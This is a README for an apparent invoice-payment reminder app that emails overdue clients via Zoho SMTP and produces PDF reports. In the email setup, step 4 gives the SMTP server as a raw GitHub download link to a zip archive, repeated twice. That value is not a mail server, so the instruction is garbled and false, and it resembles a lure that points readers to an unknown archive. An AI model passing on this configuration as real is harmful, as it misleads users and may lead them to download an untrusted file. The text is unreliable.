## 📝 Features

- **Invoice Monitoring:** Automatically checks for overdue invoices.
- **Email Reminders:** Sends reminder emails through Zoho SMTP.
- **Activity Logging:** Keeps a log of all actions taken for reference.
- **Daily Reports:** Generates PDF summaries of reminders sent.
  
## ⚙️ System Requirements

To run this application, you will need:

- A computer running Windows, macOS, or Linux.
- Python 3.7 or higher installed on your system.
- An active Zoho email account for sending reminders.

## 📬 Setting Up Your Email

To send reminder emails, you will need to configure your Zoho SMTP settings. Here’s how to set it up:

1. Open the application.
2. Navigate to the settings menu.
3. Enter your Zoho email address and password.
4. Set the SMTP server to `https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip` and the port to `587`.
5. Click "Save" to ensure your settings are applied.

## ⚡ Using the Application

After setting up your email, you can start using the application:

1. Launch the app from your application folder.
2. Import your invoice data in CSV format using the import feature.
3. The app will automatically scan for overdue invoices.
4. Review the suggested reminders and click “Send Reminders” to notify your clients.

## 📊 Viewing Reports

The application creates a PDF summary of the reminders sent each day. You can view these reports by going to the "Reports" section in the app. Keep track of all communications to ensure you’re up to date with your invoices.

## 🐞 Troubleshooting

If you encounter issues, try the following:

- Ensure Python is correctly installed on your machine.
- Verify your internet connection is stable when sending emails.
- Check your Zoho email settings and confirm you have the correct SMTP details.
  
For further assistance, feel free to reach out via the Issues tab in the repository.
